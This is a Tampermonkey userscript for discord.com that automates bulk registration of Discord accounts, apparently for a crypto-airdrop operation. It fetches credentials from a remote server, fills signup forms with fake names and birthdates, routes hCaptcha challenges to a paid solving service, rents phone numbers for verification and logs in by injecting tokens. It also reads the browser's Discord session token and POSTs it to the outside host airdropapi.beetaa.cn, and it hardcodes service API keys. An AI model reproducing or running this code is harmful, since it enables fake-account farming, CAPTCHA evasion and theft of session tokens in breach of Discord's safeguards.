// ==UserScript==
// @name         disRegV2
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  discord相关
// @author       lly
// @match        https://*.discord.com/*
// @icon         https://www.google.com/s2/favicons?domain=google.com
// @require      https://cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js
// @require      https://cdn.bootcdn.net/ajax/libs/crypto-js/3.1.9-1/crypto-js.min.js
// @require      https://cdn.bootcdn.net/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js
// @require      https://cdn.bootcdn.net/ajax/libs/Base64/1.1.0/base64.min.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/unibabel/index.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/unibabel/unibabel.hex.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/unibabel/unibabel.base32.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/forge/dist/forge.min.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/botp/sha1-hmac.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/botp/index.js
// @require      https://cdn.jsdelivr.net/npm/clshuangcool@3.0.0/authenticator.js
// @require      https://greasyfork.org/scripts/433356-authenticator/code/authenticator.js?version=975957
// @require      https://cdn.jsdelivr.net/npm/Faker@0.7.2/Faker.js
// @grant        GM_xmlhttpRequest
// @connect      weleader5.oss-cn-shenzhen.aliyuncs.com
// @connect      pv.sohu.com
// @connect      jwc.08px.cn
// @connect      clcode.getpx.cn
// @connect      2captcha.com
// @connect      smshub.org
// @connect      beetaa.cn
// @grant        unsafeWindow
// @grant        GM_addStyle
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_addValueChangeListener
// @grant        GM_removeValueChangeListener
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_log
// @grant        GM_getResourceText
// @grant        GM_getResourceURL
// @grant        GM_registerMenuCommand
// @grant        GM_unregisterMenuCommand
// @grant        GM_openInTab
// @grant        GM_xmlhttpRequest
// @grant        GM_download
// @grant        GM_getTab
// @grant        GM_saveTab
// @grant        GM_getTabs
// @grant        GM_notification
// @grant        GM_setClipboard
// @grant        GM_info
// @license      lly
// @downloadURL https://update.greasyfork.org/scripts/444621/disRegV2.user.js
// @updateURL https://update.greasyfork.org/scripts/444621/disRegV2.meta.js
// ==/UserScript==

(function() {
    'use strict';
	//程序入口-main
	var pageurl = window.location.href.split('//')[1].split('?')[0];
	var automatic = getQueryString("automatic");
	if(pageurl == 'discord.com/channels/@me' && automatic && automatic=='0'){
		getDiscordToken()
	}
    $(function () {
		pageOperate()
	})
    // Your code here...
	function pageOperate() {
        var pageurl = window.location.href.split('//')[1].split('?')[0];
		var automatic = getQueryString("automatic");
		switch (pageurl) {
				case 'discord.com/login':
					if(automatic == 'token'){
						GM_xmlhttpRequest({
							url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
							method: "POST",
							data: JSON.stringify({}),
							headers: {
								"Content-type": "application/json"
							},
							onload: function (capcoderes) {
								console.log(capcoderes)
								if (capcoderes.responseText && capcoderes.status==200) {
									//registerPage()
									console.log(1)
									var ipdata = JSON.parse(capcoderes.responseText);
									if(ipdata["status"] == 200){
										
										var regdata = ipdata["response"]
										addLoginToken(regdata["Token"])
									}
								}
							}
						});

					}
					break;
				case 'discord.com/register':
					if(automatic == '1'){
						//自动注册
						//TODO 通过接口获取注册数据
						GM_xmlhttpRequest({
							url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
							method: "POST",
							data: JSON.stringify({}),
							headers: {
								"Content-type": "application/json"
							},
							onload: function (capcoderes) {
								console.log(capcoderes)
								if (capcoderes.responseText && capcoderes.status==200) {
									//registerPage()
									console.log(1)
									var ipdata = JSON.parse(capcoderes.responseText);
									if(ipdata["status"] == 200){
										
										var regdata = ipdata["response"]
										registerPage(regdata)
									}
								}
							}
						});

					}
				break;
				case 'discord.com/channels/@me':
					//getDiscordToken()
					//alert(123)
					//1 --- 表示查看是否被封并绑定手机号
					//2 --- 表示去获取激活连接操作
					setTimeout(function(){
						//检查用户是否封禁
						//var setting = $("button[aria-label='用户设置']")
						var allbtn = document.getElementsByTagName('button')
						var fail = false
						for(var i=0;i<allbtn.length;i++){
							if(allbtn[i].innerText == '开始验证'){
								fail = true
							}
						}
						if(fail){
							//被封
							alert("被封")
							//保存数据只要有参数传进来就自动保存被封状态
							if(automatic){
								//被封数据上传
								discordStateUpdate(404)
							}
						}else{
							//没有被封
							alert("正常")
							if(automatic){
								//被封数据上传
								discordStateUpdate(105)
							}
							//读取用户token
							switch(automatic){
								case '999': //1表示查看是否被封并绑定手机号
									var setting = $("button[aria-label='用户设置']")
									setting[0].click()
									setTimeout(function(){
										var allbtn = document.getElementsByTagName('button')
										var addphoneBtn = null
										for(var i=0;i<allbtn.length;i++){
											if(allbtn[i].innerText == '添加'){
												addphoneBtn = allbtn[i]
											}
										}
										if(addphoneBtn){
											addphoneBtn.click()
											//填写手机信息
											setTimeout(function(){
												var allbtn = document.getElementsByTagName('button')
												var addphoneBtn = null
												for(var i=0;i<allbtn.length;i++){
													if(allbtn[i].innerText.indexOf('+') > -1 ){
														addphoneBtn = allbtn[i]
													}
												}
												if(addphoneBtn){
													addphoneBtn.click();
													alert(12)
													setTimeout(function(){
														var settingPhoneCode = $("input[placeholder='搜索国家']")[0]
														console.info(settingPhoneCode)
														changeReactInputValue(settingPhoneCode,"印度") //india
														setTimeout(function(){
															var countryNameNames = $('div[class^="countryName-"]')
															console.info(countryNameNames)
															var cityBtn = null
															for(var i = 0;i<countryNameNames.length;i++){
																if(countryNameNames[i].innerText == '印度'){
																	cityBtn = countryNameNames[i] 
																}
															}
															if(cityBtn){
																cityBtn.click()
																//读取手机号
																get_number("119203U35d89de52c0830e1f9b7ea623991423c",'ds', '','', '22',function(numberstr){
																	console.info(numberstr)
																	var numberid = numberstr.split(':')[1]
																	var numberphone = numberstr.split(':')[2]
																	changeReactInputValue($("input[aria-label='手机号码']")[0],numberphone) //india
																	setTimeout(function(){					
																		var allbtn = document.getElementsByTagName('button')
																		var fasongBtn = null
																		for(var i=0;i<allbtn.length;i++){
																			if(allbtn[i].innerText == '发送'){
																				fasongBtn = allbtn[i]
																			}
																		}
																		if(fasongBtn){
																			fasongBtn.click()
																			setTimeout(function(){	
																				if($('[title="widget containing checkbox for hCaptcha security challenge"]') && $('[title="widget containing checkbox for hCaptcha security challenge"]').length > 0 && $($('[title="widget containing checkbox for hCaptcha security challenge"]')[0]).attr('src')) {
																					var hcapSrc = $($('[title="widget containing checkbox for hCaptcha security challenge"]')[0]).attr('src');
																					if (hcapSrc.split('#').length > 1 && hcapSrc.split('#')[1] && hcapSrc.split('#')[1].split('sitekey=').length > 1 && hcapSrc.split('#')[1].split('sitekey=')[1].split('&')[0]) {
				
																						alert("2")
																						var sitekeycap = hcapSrc.split('#')[1].split('sitekey=')[1].split('&')[0];//getUrlParamQueryString(hcapSrc.split('?')[1],'sitekey');
																						//alert(sitekeycap)
																						console.info(sitekeycap);
																						alert("开始打码")
																						hcaptchaAuto(sitekeycap);
																						//return;
																					}
																				}else{
																					//不需要打码
																					alert("不需要打码")
																				}
																				//




																			},5000)
																		}
																		

																	},2000)		
		
																})
		
															}
														},3000)

													},2000)
												}
											},5000)
										}
										
									},10000)
								
								break;
								case '2': //2表示去获取激活连接操作
									GM_xmlhttpRequest({
										url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
										method: "POST",
										data: JSON.stringify({}),
										headers: {
											"Content-type": "application/json"
										},
										onload: function (capcoderes) {
											console.log(capcoderes)
											if (capcoderes.responseText && capcoderes.status==200) {
												//registerPage()
												console.log(1)
												var ipdata = JSON.parse(capcoderes.responseText);
												if(ipdata["status"] == 200){
													var regdata = ipdata["response"]
													jihuoPage(regdata["ActiveUrl"])
												}
											}
										}
									});
								
								break;
							}
						}
					},20000)
				break;
			
		}
		

	}


	function discordStateUpdate(IsReg){
		GM_xmlhttpRequest({
			url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
			method: "POST",
			data: JSON.stringify({}),
			headers: {
				"Content-type": "application/json"
			},
			onload: function (capcoderes) {
				console.log(capcoderes)
				if (capcoderes.responseText && capcoderes.status==200) {
					//registerPage()
					console.log(1)
					var ipdata = JSON.parse(capcoderes.responseText);
					if(ipdata["status"] == 200){
						var regdata = ipdata["response"]
						regdata["IsReg"] = IsReg
						//更新数据
						GM_xmlhttpRequest({
							url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/Post',
							method: "POST",
							data: JSON.stringify(regdata),
							headers: {
								"Content-type": "application/json"
							},
							onload: function (capcoderes) {
								console.log(capcoderes)
							}
						});

					}
				}
			}
		});
	}

	function jihuoPage(url){
		unsafeWindow.location.href = url;
	}

	function registerPage(regdata){
		var Email = regdata["Email"]
		var Password = regdata["Password"]
		var randomName = Faker.Name.findName().replace(' ','');
		var timedate = Faker.Date.between('1980-01-01T00:00:00.000Z', '2000-01-01T00:00:00.000Z')
		var timedate02 = new Date(timedate)
		console.log(timedate)
		var year = timedate02.getFullYear()
		var month = timedate02.getMonth()
		var day = timedate02.getDate()
		setTimeout(function(){
			setTimeout(function(){
				changeReactInputValue($("input[name='email']")[0],Email) //邮箱
				changeReactInputValue($("input[name='username']")[0],randomName) //用户名
				changeReactInputValue($("input[name='password']")[0],Password) //密码
				setTimeout(function(){
					changeReactInputValue($("input[aria-label='年']")[0],year.toString()) //年
					setTimeout(function(){
						var yeardomid = $("input[aria-label='年']")[0].getAttribute("id").replace('-input','-option-')
						$("div[id^='"+yeardomid+"']")[0].click()
						setTimeout(function(){
							changeReactInputValue($("input[aria-label='月']")[0],month.toString()) //月
							setTimeout(function(){
								var monthdomid = $("input[aria-label='月']")[0].getAttribute("id").replace('-input','-option-')
								$("div[id^='"+monthdomid+"']")[0].click()
								setTimeout(function(){
									changeReactInputValue($("input[aria-label='日']")[0],day.toString()) //日
									setTimeout(function(){
										var daydomid = $("input[aria-label='日']")[0].getAttribute("id").replace('-input','-option-')
										$("div[id^='"+daydomid+"']")[0].click()
										var check = $("input[type='checkbox']")
										for(var i=0;i<check.length;i++){
											check[i].click()
										}
										setTimeout(function(){
											$("button[type='submit']")[0].click()
											setTimeout(function(){
												if($('[title="widget containing checkbox for hCaptcha security challenge"]') && $('[title="widget containing checkbox for hCaptcha security challenge"]').length > 0 && $($('[title="widget containing checkbox for hCaptcha security challenge"]')[0]).attr('src')) {
													var hcapSrc = $($('[title="widget containing checkbox for hCaptcha security challenge"]')[0]).attr('src');
													if (hcapSrc.split('#').length > 1 && hcapSrc.split('#')[1] && hcapSrc.split('#')[1].split('sitekey=').length > 1 && hcapSrc.split('#')[1].split('sitekey=')[1].split('&')[0]) {

														alert("2")
														var sitekeycap = hcapSrc.split('#')[1].split('sitekey=')[1].split('&')[0];//getUrlParamQueryString(hcapSrc.split('?')[1],'sitekey');
														//alert(sitekeycap)
														console.info(sitekeycap);
														alert("开始打码")
														hcaptchaAuto(sitekeycap);
														//return;
													}
												}else{
													//不需要打码
													alert("不需要打码")
												}
											},5000)
											
										},2000)
									},2000)
								
								},2000)
							
							},2000)
						
						},2000)
					
					},2000)
				},2000)
			},2000)
		},10000)
	}

	function addLoginToken(token){
		unsafeWindow.t = token;
		unsafeWindow.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;
		unsafeWindow.setInterval(() => unsafeWindow.localStorage.token = `"${unsafeWindow.t}"`); 
		unsafeWindow.location.href = 'https://discord.com/channels/@me';
	}
	function getDiscordToken(){
		if(!window.localStorage) {
			Object.defineProperty(window, "localStorage", new(function () {
			   var aKeys = [],
				  oStorage = {};
			   Object.defineProperty(oStorage, "getItem", {
				  value: function (sKey) {
					 return this[sKey] ? this[sKey] : null;
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "key", {
				  value: function (nKeyId) {
					 return aKeys[nKeyId];
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "setItem", {
				  value: function (sKey, sValue) {
					 if(!sKey) {
						return;
					 }
					 document.cookie = escape(sKey) + "=" + escape(sValue) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "length", {
				  get: function () {
					 return aKeys.length;
				  },
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "removeItem", {
				  value: function (sKey) {
					 if(!sKey) {
						return;
					 }
					 document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   Object.defineProperty(oStorage, "clear", {
				  value: function () {
					 if(!aKeys.length) {
						return;
					 }
					 for(var sKey in aKeys) {
						document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
					 }
				  },
				  writable: false,
				  configurable: false,
				  enumerable: false
			   });
			   this.get = function () {
				  var iThisIndx;
				  for(var sKey in oStorage) {
					 iThisIndx = aKeys.indexOf(sKey);
					 if(iThisIndx === -1) {
						oStorage.setItem(sKey, oStorage[sKey]);
					 } else {
						aKeys.splice(iThisIndx, 1);
					 }
					 delete oStorage[sKey];
				  }
				  for(aKeys; aKeys.length > 0; aKeys.splice(0, 1)) {
					 oStorage.removeItem(aKeys[0]);
				  }
				  for(var aCouple, iKey, nIdx = 0, aCouples = document.cookie.split(/\s*;\s*/); nIdx < aCouples.length; nIdx++) {
					 aCouple = aCouples[nIdx].split(/\s*=\s*/);
					 if(aCouple.length > 1) {
						oStorage[iKey = unescape(aCouple[0])] = unescape(aCouple[1]);
						aKeys.push(iKey);
					 }
				  }
				  return oStorage;
			   };
			   this.configurable = false;
			   this.enumerable = true;
			})());
		 }
		 //---------------------------------------------------
	  
		 var userToken = localStorage.getItem('token');
	  
		 var warn = "Giving people tokens is a good idea! :3"
	  
		 // show warning, if accepted show token
		 document.addEventListener('readystatechange', event => {
			if(event.target.readyState === "interactive") {} else if(event.target.readyState === "complete") {
			   setTimeout(function () {
				  //if(confirm(warn)) {
				  //	 prompt("Your token:", userToken)
				  //}
				  //存储用户Token
				  console.info("================================")
				  console.info(userToken)

				  GM_xmlhttpRequest({
						url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/GetOneAcc',
						method: "POST",
						data: JSON.stringify({}),
						headers: {
							"Content-type": "application/json"
						},
						onload: function (capcoderes) {
							console.log(capcoderes)
							if (capcoderes.responseText && capcoderes.status==200) {
								//registerPage()
								console.log(1)
								var ipdata = JSON.parse(capcoderes.responseText);
								if(ipdata["status"] == 200){
									var regdata = ipdata["response"]
									regdata["IsReg"] = 105
									regdata["Token"] = userToken
									//更新数据
									GM_xmlhttpRequest({
										url: 'http://airdropapi.beetaa.cn:3019/api/Discord_Main/Post',
										method: "POST",
										data: JSON.stringify(regdata),
										headers: {
											"Content-type": "application/json"
										},
										onload: function (capcoderes) {
											console.log(capcoderes)
										}
									});
			
								}
							}
						}
					});


				  console.info("================================")
			   }, 3000);
			}
		 });
	}
	function changeReactInputValue(inputDom,newText){
		let lastValue = inputDom.value;
		inputDom.value = newText;
		let event = new Event('input', { bubbles: true });
		event.simulated = true;
		let tracker = inputDom._valueTracker;
		if (tracker) {
		tracker.setValue(lastValue);
		}
		inputDom.dispatchEvent(event);
	}

    function hcaptchaAuto(selfsitekeycap) {
        //去做h人机验证
        if (selfsitekeycap) {
            console.info('http://2captcha.com/in.php?key=713882cc1979e7de38a57e9870ce616f&method=hcaptcha&sitekey=' + selfsitekeycap + '&pageurl=https://discord.com/register/');
            GM_xmlhttpRequest({
                url: 'http://2captcha.com/in.php?key=713882cc1979e7de38a57e9870ce616f&method=hcaptcha&sitekey=' + selfsitekeycap + '&pageurl=https://discord.com/register/',
                method: "GET",
                data: "",
                headers: {
                    "Content-type": "application/x-www-form-urlencoded"
                },
                onload: function (capdata) {
                    console.info(capdata.responseText);
                    var capcode = capdata.responseText;
                    if (capcode && capcode.split('|').length > 1) {
                        capcode = capcode.split('|')[1];
                        var codeEnd = '';
                        var inal = setInterval(function () {
                            console.info('开始执行');
                            console.info('http://2captcha.com/res.php?key=713882cc1979e7de38a57e9870ce616f&action=get&id=' + capcode + '&tt=' + Date.parse(new Date()).toString())
                            GM_xmlhttpRequest({
                                url: 'http://2captcha.com/res.php?key=713882cc1979e7de38a57e9870ce616f&action=get&id=' + capcode + '&tt=' + Date.parse(new Date()).toString(),
                                method: "GET",
                                data: "",
                                headers: {
                                    "Content-type": "application/x-www-form-urlencoded"
                                },
                                onload: function (capcoderes) {
                                    if (capcoderes.responseText && capcoderes.responseText.length > 50 && capcoderes.responseText.split('|').length > 1) {
                                        clearInterval(inal);
                                        codeEnd = capcoderes.responseText.split('|')[1];
                                        //赋值
                                        console.info('谷歌验证请求code', codeEnd)
                                        console.info('谷歌验证请求unsafeWindow', unsafeWindow)
                                        $('textarea').show();
                                        $('textarea').val(codeEnd);
                                        for (var key in unsafeWindow) {
                                            if (key.indexOf('hcaptchaCallback') > -1) {
                                                console.info('找到了回调方法+++++', key);
                                                eval(key + '("' + codeEnd + '")');
                                                break;
                                            }
                                        }

                                        //___grecaptcha_cfg.clients['0']['l']['l'].callback(codeEnd)
                                        console.info('H验证请求成功')
                                    }
                                    //console.info(capcoderes.responseText);
                                }
                            });

                        }, 1000);
                    }
                }
            });
        }

    }
	
	function sleep(delay) {
		var start = (new Date()).getTime();
		while ((new Date()).getTime() - start < delay) {
		continue;
		}
	}
	
	 //采用正则表达式获取地址栏参数
    function getQueryString(name) {
        let reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
        let r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return decodeURIComponent(r[2]);
        };
        return null;
    }

	//获取手机号
	function get_number(api_key, service, operator, forward, country,callback){
		var params = {
			"api_key": api_key,
			"action": "getNumber",
			"service": service,
			"operator": operator,
			"forward": forward,
			"country": country,
		}
		console.info(params)
		GM_xmlhttpRequest({
				url: "https://smshub.org/stubs/handler_api.php?api_key="+api_key+"&action=getNumber&service="+service,
				method: "GET",
				headers: {
					"Content-type": "application/x-www-form-urlencoded"
				},
				onload: function (xhr) {
					console.info('ip地址：', xhr.responseText)
					if(xhr.status==200)
					{
						 var statusbody = xhr.responseText;
						 //alert(statusbody)
						 if(statusbody.split(':')[0] == "ACCESS_NUMBER"){
							callback(statusbody)
						 }
					}
				}
		})
	}



})();